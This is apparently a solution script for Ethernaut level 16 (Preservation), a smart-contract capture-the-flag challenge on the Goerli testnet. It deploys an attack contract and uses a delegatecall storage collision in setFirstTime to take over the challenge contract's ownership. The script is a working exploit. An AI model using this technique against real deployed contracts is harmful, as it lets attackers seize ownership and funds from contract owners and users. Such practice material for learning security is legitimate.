const ethers = require('ethers');
require ('dotenv').config ()

import PreservationJSON from '../../../artifacts/contracts/level16/Preservation.sol/Preservation.json';
import AttackJSON from '../../../artifacts/contracts/level16/Attack.sol/Attack.json';

const privateKey = process.env.ACTOR_PRIVATE_KEY as string;
const preservationContractAddress = process.env.INSTANCE_ADDRESS as string;
const provider = new ethers.providers.AlchemyProvider('goerli', process.env.ALCHEMY_API_KEY);

const main = async () => {
    console.log(`Ethernaut level 16 - script made by JoVi\n ------`);
    const wallet = await new ethers.Wallet(privateKey, provider);
    const signer = wallet.connect(provider);

    const preservationContract = new ethers.Contract(preservationContractAddress, PreservationJSON.abi, signer);
    
    const attackContractInterface = new ethers.ContractFactory(AttackJSON.abi, AttackJSON.bytecode, signer);
    const attackContract = await attackContractInterface.deploy();
    console.log(`Attack succesfully deployed at address ${attackContract.address}\n ------`);
    
    const setFirstTimeTx = await preservationContract.setFirstTime(attackContract.address);
    const setFirstTimeTxReceipt = await setFirstTimeTx.wait();
    console.log(`timeZone1Library set to ${attackContract.address}\n ------`);

    console.log(`Attempting to change ${preservationContract.address}'s owner to ${wallet.address}\n ------`);
    
    const setFirstTimeTx2 = await preservationContract.setFirstTime(wallet.address, {gasLimit: 500000});
    const setFirstTimeTx2Receipt = await setFirstTimeTx2.wait();
    console.log(`Owner set to ${wallet.address}\n ------`);

}

main();
